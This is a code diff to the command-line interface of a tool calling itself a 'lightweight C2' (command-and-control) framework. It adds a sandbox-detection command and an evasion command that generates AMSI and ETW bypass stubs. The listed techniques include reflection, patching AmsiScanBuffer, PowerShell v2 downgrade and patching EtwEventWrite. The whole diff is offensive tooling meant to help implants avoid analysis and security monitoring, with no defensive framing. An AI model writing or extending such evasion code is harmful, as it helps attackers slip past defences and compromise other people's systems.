@@ -265,6 +265,68 @@ def cmd_run_module(args):
         print(f"\033[92m[queued]\033[0m module={args.module} cmd_id={data.get('id', '?')}")
 
 
+
+
+# === New commands: sandbox, evasion ===
+
+def cmd_sandbox(args):
+    """Run sandbox detection checks."""
+    from c2_37.sandbox import SandboxDetector
+    results = SandboxDetector.check_all()
+    if args.json_output:
+        print(json.dumps(results, indent=2))
+    else:
+        print("\n  Sandbox Detection Results")
+        print("  " + "=" * 50)
+        for key, val in results.items():
+            if key in ("score", "is_sandbox"):
+                continue
+            status = "SUSPICIOUS" if val else "OK"
+            marker = "[!]" if val else "[+]"
+            print("  {} {:25s} {}".format(marker, key, status))
+        print("  " + "-" * 50)
+        print("  Score: {}/{}".format(results["score"], len(results) - 2))
+        verdict = "SANDBOX DETECTED" if results["is_sandbox"] else "Likely real system"
+        print("  Verdict: " + verdict)
+        print()
+
+
+def cmd_evasion(args):
+    """Generate AMSI/ETW evasion stubs."""
+    from c2_37.etw_amsi import generate_evasion_stub, AMSIBypass, ETWBypass
+
+    if args.list:
+        print("\n  Available evasion techniques:")
+        print("  AMSI Bypasses:")
+        print("    reflection   - Set amsiInitFailed via .NET reflection")
+        print("    patching     - Patch AmsiScanBuffer in memory")
+        print("    force_error  - Corrupt AMSI context")
+        print("    downgrade    - PowerShell v2 downgrade (no AMSI)")
+        print("  ETW Bypasses:")
+        print("    etw_patch    - Patch EtwEventWrite")
+        print("    etw_reflect  - Disable ETW via reflection")
+        print()
+        return
+
+    if args.stub:
+        if args.stub == "etw_patch":
+            print(ETWBypass.patch_etw_powershell())
+        elif args.stub == "etw_reflect":
+            print(ETWBypass.disable_etw_reflection())
+        elif args.stub in ("reflection", "patching", "force_error", "downgrade"):
+            method = getattr(AMSIBypass, args.stub)
+            print(method())
+        else:
+            print("Unknown stub: " + args.stub)
+            return
+    else:
+        # Generate combined stub
+        code = generate_evasion_stub(
+            amsi=not args.no_amsi,
+            etw=not args.no_etw,
+            method=args.method,
+        )
+        print(code)
 def main():
     parser = argparse.ArgumentParser(prog="c37", description="c2-37 \u2014 lightweight C2")
     parser.add_argument("--port", type=int, default=8037, help="C2 server port")
@@ -295,6 +357,18 @@ def main():
     p.add_argument("agent")
     p.add_argument("module")
 
+    # Sandbox detection
+    p = sub.add_parser("sandbox", help="Run sandbox detection checks")
+    p.add_argument("--json", dest="json_output", action="store_true", help="JSON output")
+
+    # Evasion stubs
+    p = sub.add_parser("evasion", help="Generate AMSI/ETW evasion stubs")
+    p.add_argument("--list", action="store_true", help="List available techniques")
+    p.add_argument("--stub", default=None, help="Generate specific stub")
+    p.add_argument("--method", default="reflection", help="AMSI bypass method")
+    p.add_argument("--no-amsi", action="store_true", help="Skip AMSI bypass")
+    p.add_argument("--no-etw", action="store_true", help="Skip ETW bypass")
+
     args = parser.parse_args()
 
     if args.command == "start":
@@ -314,6 +388,10 @@ def main():
         cmd_modules(args)
     elif args.command == "run":
         cmd_run_module(args)
+    elif args.command == "sandbox":
+        cmd_sandbox(args)
+    elif args.command == "evasion":
+        cmd_evasion(args)
     else:
         parser.print_help()
 
